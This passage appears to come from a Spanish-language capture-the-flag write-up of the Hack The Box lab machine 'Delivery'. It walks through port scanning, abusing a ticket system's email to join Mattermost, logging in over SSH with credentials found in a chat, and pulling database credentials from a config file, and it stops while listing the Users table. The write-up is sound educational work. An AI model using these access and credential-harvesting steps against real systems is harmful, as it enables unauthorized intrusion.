+</span></span><span style="display:flex;"><span>SF:00<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;)%r(Help,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\
+</span></span></span><span style="display:flex;"><span>SF:nContent-Type:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>SF:r<span style="color:#ae81ff">\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;)%r(SSLSessionReq,67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>SF:Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\x</span>20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Conn
+</span></span><span style="display:flex;"><span>SF:ection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;)%r(TerminalServerCookie,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:67,&#34;</span>HTTP/1<span style="color:#ae81ff">\.</span>1<span style="color:#ae81ff">\x</span>20400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#ae81ff">\r\n</span>Content-Type:<span style="color:#ae81ff">\x</span>20text/plain;<span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>SF:x20charset<span style="color:#f92672">=</span>utf-8<span style="color:#ae81ff">\r\n</span>Connection:<span style="color:#ae81ff">\x</span>20close<span style="color:#ae81ff">\r\n\r\n</span>400<span style="color:#ae81ff">\x</span>20Bad<span style="color:#ae81ff">\x</span>20Request<span style="color:#e6db74">&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap done: 1 IP address (1 host up) scanned in 100.00 seconds
+</span></span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Ese puerto 8065 se me hace curioso, puede que estemos contra un Virtual Hosting, pero analicemos primero el puerto HTTP.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura1.png">
+</p>
+<p>Se ve chula, veamos que nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura2.png">
+</p>
+<p>Ahora probemos con <strong>whatweb</strong> por si nos da algo más:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>whatweb http://10.10.10.222
+</span></span><span style="display:flex;"><span>http://10.10.10.222 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>jane@untitled.tld<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>nginx/1.14.2<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.10.222<span style="color:#f92672">]</span>, JQuery, Script, Title<span style="color:#f92672">[</span>Welcome<span style="color:#f92672">]</span>, nginx<span style="color:#f92672">[</span>1.14.2<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>Mmmmm <strong>nginx</strong> otra vez, tengámoslo en cuenta para más adelante.</p>
+<p>Si analizamos la página, tiene 2 botónes que nos redirigen a otras páginas, el primero que llama la atención es el de <strong>CONTACT US</strong>, entremos primero a ese:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura3.png">
+</p>
+<p>Una vez ahí, nos menciona que para usuarios no registrados podemos entrar al <strong>HelpDesk</strong>, ese registro nos dara un correo tipo <strong>@delivery.htb</strong> con el que podremos entrar al servidor <strong>Mattermost</strong>.</p>
+<p>La página de <strong>HelpDesk</strong>, es la misma que se menciona en la página principal.</p>
+<p>Entremos a ambas para ver que podemos encontrar:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura4.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura5.png">
+</p>
+<p>No vemos nada, esto indica que estan aplicando <strong>Virtual Hosting</strong>. Vamos a registrar el dominio y subdominio (el dominio del <strong>HelpDesk</strong>) en el <strong>/etc/hosts</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nano /etc/hosts
+</span></span><span style="display:flex;"><span>10.10.10.222 delivery.htb helpdesk.delivery.htb
+</span></span></code></pre></div><p>Y recarguemos otra vez las páginas, ya deberían verse:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura6.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura7.png">
+</p>
+<p>Excelente, tenemos lo que parece ser un sistema de tickets y un login en la otra página, en ambas se menciona un servicio distinto, en el sistema de tickets aparece el servicio <strong>OS Ticket</strong> y en el login aparece <strong>Mattermost</strong>.</p>
+<p>Investiguemos un poquito que son:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Servicio OS Ticket</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Es un sistema de tickets de asistencia de código abierto. Dirige las consultas creadas a través de correo electrónico, formularios web y llamadas telefónicas hacia una plataforma de asistencia al cliente sencilla, fácil de usar y multiusuario basada en la web.</em></td>
+			</tr>
+	</tbody>
+</table>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Servicio Mattermost</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Mattermost es un servicio de chat en línea de código abierto y autohospedable con intercambio de archivos, búsqueda e integraciones. Está diseñado como un chat interno para organizaciones y empresas, y en su mayoría se comercializa como una alternativa de código abierto a Slack y Microsoft Teams.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Bien, como de momento no tenemos credenciales que podamos usar contra el login de <strong>Mattermost</strong>, vamos directamente a probar el sistema de tickets para poder registrarnos y crear un usuario.</p>
+<h3 id="Ticket">Probando Servicio OS Ticket y Ganando Acceso a Servicio Mattermost</h3>
+<p>Revisando las funciones de la página, encontramos la opción para crear una cuenta, el problema es que nos piden verificar la cuenta aprobando un correo que ellos nos manden, esto no nos fucionara por lo que descartamos esta función.</p>
+<p>Tratemos de abrir un nuevo ticket, para ver que pasa:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura8.png">
+</p>
+<p>Nos pidió algunos datos como correo, nombre, asunto, etc. Unicamente recuerda los más importantes, que son los datos obligatorios que pide la página, esto para usarlos más adelante.</p>
+<p>Y nos da este resultado.</p>
+<p>Si analizamos el ticket, nos da información que podemos guardar y probar:</p>
+<ul>
+<li>Nos dio un ID.</li>
+<li>Nos dio un email.</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura9.png">
+</p>
+<p>Ahora, veamos que información se muestra al revisar nuestro ticket, ve a la sección <strong>Check Ticket Status</strong>, probemos si con el email que nos dio podemos entrar:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura10.png">
+</p>
+<p>Y nos da error, hagámoslo con el correo de prueba que metimos al crear el ticket:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura11.png">
+</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura12.png">
+</p>
+<p>Excelente, podemos ver la información de nuestro ticket.</p>
+<p>Recordando lo que nos dijo la página principal, ya tenemos un correo valido para registrarnos en el servidor <strong>Mattermost</strong>, probemos a registrar el email que nos dio el sistema de tickets.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura13.png">
+</p>
+<p>Muy bien, ya se creó, pero igual nos pide que verifiquemos a través de un email que <strong>Mattermost</strong> envío.</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura20.png">
+</p>
+<p>¿Se abra enviado algo a la cuenta del ticket? Comprobemos:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura14.png">
+</p>
+<p>Excelente, usemos el link que nos mandaron para autenticar la nueva cuenta del servicio <strong>Mattermost</strong>, solo copia y pega el link en una nueva pestaña:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura15.png">
+</p>
+<p>Bien, escribe la contraseña de prueba que hayas puesto y logueate:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura16.png">
+</p>
+<p>Estamos dentro, ahora podemos investigar lo que hay dentro.</p>
+<h2 id="Explotacion">Explotación de Vulnerabilidades</h2>
+<h3 id="Matter">Analizando Servicio Mattermost</h3>
+<p>Bien, veamos que hay dentro una vez logueados:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura17.png">
+</p>
+<p>Vamos a darle skip y veamos que nos muestra:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura18.png">
+</p>
+<p>Al parecer, nos muestra la conversación de un usuario root hacia el equipo de desarrollo. En resumen, menciona que necesitan cambiar una plantilla del sistema de tickets y con esto da un usuario y contraseña para entrar al servidor, aunque no menciona a que servidor, supongo que se refiere al <strong>servicio SSH</strong>.</p>
+<p>Además, menciona que deben crear un programa que los ayude a crear distintas contraseñas, pues no quieren que la contraseña que siempre usan en casi todo, quede registrada en el Rockyou y/o un hacker se pueda aprovechar de esta.</p>
+<p>Antes de probar la contraseña del servidor, veamos si podemos obtener la versión del servicio <strong>Mattermost</strong> por si lo necesitamos después para buscar un exploit:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-delivery/Captura19.png">
+</p>
+<p>Ahora sí, probemos entrar al <strong>servicio SSH</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh maildeliverer@10.10.10.222
+</span></span><span style="display:flex;"><span>maildeliverer@10.10.10.222<span style="color:#e6db74">&#39;s password:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">maildeliverer@10.10.10.222&#39;</span>s password: 
+</span></span><span style="display:flex;"><span>Linux Delivery 4.19.0-13-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.160-2 (2020-11-28) x86_64</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
+</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style="display:flex;"><span>permitted by applicable law.
+</span></span><span style="display:flex;"><span>Last login: Fri May  <span style="color:#ae81ff">5</span> 15:25:14 <span style="color:#ae81ff">2023</span> from 10.10.14.16
+</span></span><span style="display:flex;"><span>maildeliverer@Delivery:~$ whoami
+</span></span><span style="display:flex;"><span>maildeliverer
+</span></span></code></pre></div><p>¡Excelente! Busquemos la flag del usuario:</p>
+<pre tabindex="0"><code>maildeliverer@Delivery:~$ ls
+user.txt
+maildeliverer@Delivery:~$ cat user.txt
+...
+</code></pre><p>Listo, ahora busquemos la forma de escalar privilegios.</p>
+<h2 id="Post">Post Explotación</h2>
+<h3 id="Matter2">Buscando Hashes del Servicio Mattermost</h3>
+<p>Recordando lo que menciono el root en el servidor de <strong>Mattermost</strong>, se menciona un programa para ya no reusar la misma constraseña en todo su sistema, pues si un hacker obtiene los hashes que tienen almacenados, este puede usar las reglas de hashcat para poder crackear y obtener distintas variaciones de la misma contraseña.</p>
+<p>Esto obviamente es una pista de lo que debemos hacer, lo principal sería buscar los hashes del servicio <strong>Mattermost</strong> y luego utilizar la contraseña que menciona el root (<strong>PleaseSubscribe!</strong>) para crear variaciones con las reglas de <strong>hashcat</strong>, esto con el fin de crackear esos hashes.</p>
+<p>Busquemos información sobre donde estan estos hashes.</p>
+<p>Checa este blog sobre <strong>Mattermost</strong>:</p>
+<ul>
+<li><a href="https://www.drivemeca.com/mattermost-linux-server/" target="_blank">Mattermost Linux Server</a></li>
+</ul>
+<p>Hay un archivo llamado <strong>config.json</strong>, que se encuentra en el directorio <strong>/opt/mattermost/</strong>.</p>
+<p>Este puede contener información valiosa de la base de datos (como los hashes que buscamos), vayamos a verla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>maildeliverer@Delivery:~$ cd /opt/mattermost
+</span></span><span style="display:flex;"><span>maildeliverer@Delivery:/opt/mattermost$ ls
+</span></span><span style="display:flex;"><span>bin     config  ENTERPRISE-EDITION-LICENSE.txt  i18n  manifest.txt  plugins              README.md
+</span></span><span style="display:flex;"><span>client  data    fonts                           logs  NOTICE.txt    prepackaged_plugins  templates
+</span></span><span style="display:flex;"><span>maildeliverer@Delivery:/opt/mattermost$ cd config/
+</span></span><span style="display:flex;"><span>maildeliverer@Delivery:/opt/mattermost/config$ ls
+</span></span><span style="display:flex;"><span>cloud_defaults.json  config.json  README.md
+</span></span></code></pre></div><p>Veamos el interior:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">maildeliverer@Delivery:/opt/mattermost/config$</span> <span style="color:#960050;background-color:#1e0010">cat</span> <span style="color:#960050;background-color:#1e0010">config.json</span> 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;ServiceSettings&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;SiteURL&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;WebsocketURL&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;LicenseFileLocation&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;ListenAddress&#34;</span>: <span style="color:#e6db74">&#34;:8065&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;ConnectionSecurity&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;TLSCertFile&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;TLSKeyFile&#34;</span>: <span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;TLSMinVer&#34;</span>: <span style="color:#e6db74">&#34;1.2&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;TLSStrictTransport&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">...</span>
+</span></span></code></pre></div><p>Contiene bastante información, si usamos <strong>grep</strong> buscando las palabras <strong>sql</strong> o <strong>mysql</strong>, nos dará un resultado más acertado de donde buscar:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>maildeliverer@Delivery:/opt/mattermost/config$ cat config.json | grep sql
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;DriverName&#34;</span>: <span style="color:#e6db74">&#34;mysql&#34;</span>,
+</span></span></code></pre></div><p>Y buscando eso, encontramos algo importante y crítico:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">&#34;SqlSettings&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;DriverName&#34;</span>: <span style="color:#e6db74">&#34;mysql&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;DataSource&#34;</span>: <span style="color:#e6db74">&#34;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;DataSourceReplicas&#34;</span>: [],
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;DataSourceSearchReplicas&#34;</span>: [],
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;MaxIdleConns&#34;</span>: <span style="color:#ae81ff">20</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;ConnMaxLifetimeMilliseconds&#34;</span>: <span style="color:#ae81ff">3600000</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;MaxOpenConns&#34;</span>: <span style="color:#ae81ff">300</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;Trace&#34;</span>: <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;AtRestEncryptKey&#34;</span>: <span style="color:#e6db74">&#34;n5uax3d4f919obtsp1pw1k5xetq1enez&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;QueryTimeout&#34;</span>: <span style="color:#ae81ff">30</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;DisableDatabaseSearch&#34;</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    }<span style="color:#960050;background-color:#1e0010">,</span>
+</span></span></code></pre></div><p>Tenemos un usuario y contraseña para conectarnos a la base de datos de <strong>MySQL</strong>.</p>
+<p>Si no sabes como se hace esto, checa este blog:</p>
+<ul>
+<li><a href="https://help.dreamhost.com/hc/es/articles/214882998-Conectarse-a-una-base-de-datos-v%C3%ADa-SSH" target="_blank">Conectarse a una base de datos vía SSH</a></li>
+</ul>
+<p>Bien, conectémonos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p
+</span></span><span style="display:flex;"><span>Enter password: 
+</span></span><span style="display:flex;"><span>Welcome to the MariaDB monitor.  Commands end with ; or <span style="color:#ae81ff">\g</span>.
+</span></span><span style="display:flex;"><span>Your MariaDB connection id is <span style="color:#ae81ff">98</span>
+</span></span><span style="display:flex;"><span>Server version: 10.3.27-MariaDB-0+deb10u1 Debian <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#39;help;&#39;</span> or <span style="color:#e6db74">&#39;\h&#39;</span> <span style="color:#66d9ef">for</span> help. Type <span style="color:#e6db74">&#39;\c&#39;</span> to clear the current input statement.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>MariaDB <span style="color:#f92672">[(</span>none<span style="color:#f92672">)]</span>&gt;
+</span></span></code></pre></div><p>Ahora investiguemos la base de datos.</p>
+<h4 id="Mysql">Enumeración de Base de Datos MySQL</h4>
+<p>Veamos primero que bases de datos hay:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>MariaDB [(<span style="color:#66d9ef">none</span>)]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> databases;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> <span style="color:#66d9ef">Database</span>           <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> information_schema <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> mattermost         <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span> <span style="color:#66d9ef">rows</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">001</span> sec)
+</span></span></code></pre></div><p>Usemos la BD <strong>Mattermost</strong> y veamos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>MariaDB [(<span style="color:#66d9ef">none</span>)]<span style="color:#f92672">&gt;</span> use mattermost
+</span></span><span style="display:flex;"><span>Reading <span style="color:#66d9ef">table</span> information <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">completion</span> <span style="color:#66d9ef">of</span> <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">column</span> <span style="color:#66d9ef">names</span>
+</span></span><span style="display:flex;"><span>You can turn <span style="color:#66d9ef">off</span> this feature <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">get</span> a quicker startup <span style="color:#66d9ef">with</span> <span style="color:#f92672">-</span>A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Database</span> changed
+</span></span><span style="display:flex;"><span>MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">show</span> tables;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------------+
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Tables_in_mattermost   <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------------+
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Audits                 <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Bots                   <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ChannelMemberHistory   <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ChannelMembers         <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> ...			 <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Threads                <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Tokens                 <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> UploadSessions         <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> UserAccessTokens       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> UserGroups             <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> UserTermsOfService     <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Users                  <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">------------------------+
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff">46</span> <span style="color:#66d9ef">rows</span> <span style="color:#66d9ef">in</span> <span style="color:#66d9ef">set</span> (<span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">000</span> sec)
+</span></span></code></pre></div><p>Tenemos varias tablas, pero me llama la atención la de <strong>Users</strong>, veamos su contenido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>MariaDB [mattermost]<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">describe</span> Users;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+--------------+------+-----+---------+-------+
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Field              <span style="color:#f92672">|</span> <span style="color:#66d9ef">Type</span>         <span style="color:#f92672">|</span> <span style="color:#66d9ef">Null</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Key</span> <span style="color:#f92672">|</span> <span style="color:#66d9ef">Default</span> <span style="color:#f92672">|</span> Extra <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">+</span><span style="color:#75715e">--------------------+--------------+------+-----+---------+-------+
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Id                 <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">26</span>)  <span style="color:#f92672">|</span> <span style="color:#66d9ef">NO</span>   <span style="color:#f92672">|</span> PRI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> CreateAt           <span style="color:#f92672">|</span> bigint(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> UpdateAt           <span style="color:#f92672">|</span> bigint(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> DeleteAt           <span style="color:#f92672">|</span> bigint(<span style="color:#ae81ff">20</span>)   <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> MUL <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">|</span> Username           <span style="color:#f92672">|</span> varchar(<span style="color:#ae81ff">64</span>)  <span style="color:#f92672">|</span> YES  <span style="color:#f92672">|</span> UNI <span style="color:#f92672">|</span> <span style="color:#66d9ef">NULL</span>    <span style="color:#f92672">|</span>       <span style="color:#f92672">|</span>
